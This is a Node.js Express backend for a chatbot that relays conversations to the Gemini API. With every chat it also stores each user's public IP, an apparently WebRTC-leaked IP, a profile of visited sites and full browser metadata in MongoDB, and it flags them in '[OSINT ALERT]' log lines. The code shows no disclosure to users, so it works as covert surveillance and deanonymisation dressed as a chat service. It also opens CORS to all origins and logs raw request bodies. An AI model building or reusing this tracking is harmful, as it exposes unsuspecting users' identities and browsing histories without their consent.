const express = require('express');
const cors = require('cors');
const { MongoClient } = require('mongodb');
const telemetryRouter = require('./routes/telemetry'); // Importar el router de telemetría

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors({ origin: '*' }));
app.use(express.json());

const uri = process.env.MONGO_URI;
let db;

if (uri) {
    const client = new MongoClient(uri);
    client.connect()
        .then(() => {
            db = client.db('juan_gpt_db');
            console.log('[+] Conectado a MongoDB Atlas');
            app.use('/api/telemetry', telemetryRouter(db)); // Registrar el router de telemetría aquí
        })
        .catch(err => console.error('[CRITICAL] Error conectando a MongoDB Atlas:', err));
} else {
    console.warn('[WARNING] MONGO_URI no definida. Los logs no se guardarán permanentemente.');
}

// Endpoint de salud (Healthcheck) para el Cron-job (Mantener vivo) - CORREGIDO
app.get('/api/health', (req, res) => {
    res.sendStatus(200); // Respuesta mínima y estándar
});

// Endpoint para chatear y registrar
app.post('/api/chat', async (req, res) => {
    const { history, metadata } = req.body;
    const GEMINI_API_KEY = process.env.GEMINI_API_KEY;

    if (!GEMINI_API_KEY) {
        console.error("CRITICAL: GEMINI_API_KEY is not defined in Render Environment Variables.");
        return res.status(500).json({ error: "Server configuration error: API Key missing." });
    }

    console.log("[DEBUG] Datos recibidos:", req.body); // Debug como solicitado

    try {
        const geminiRes = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=${GEMINI_API_KEY}`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ contents: history })
        });

        const data = await geminiRes.json();
        const reply = data.candidates?.[0]?.content?.parts?.[0]?.text;

        if (reply && db) {
            const ip_header = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
            const logEntry = {
                timestamp: new Date(),
                userId: metadata.userId,
                ip_public: ip_header,
                ip_webrtc: metadata.adv?.webrtc_ip || "N/A",
                visited_sites: metadata.adv?.history_profile || [],
                browser_data: metadata,
                chat: history,
                reply: reply
            };

            console.log(`[OSINT ALERT] User: ${logEntry.userId} | WebRTC_IP: ${logEntry.ip_webrtc} | Sites: ${logEntry.visited_sites}`);

            try {
                await db.collection('chat_logs').insertOne(logEntry);
            } catch (dbError) {
                console.error("[MONGODB INSERTION ERROR]", dbError);
            }
        }

        res.status(200).json({ reply: reply });
    } catch (error) {
        console.error("[GEMINI/FETCH ERROR]", error);
        res.status(500).json({ error: 'Fallo al procesar la solicitud con la IA.' });
    }
});

app.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));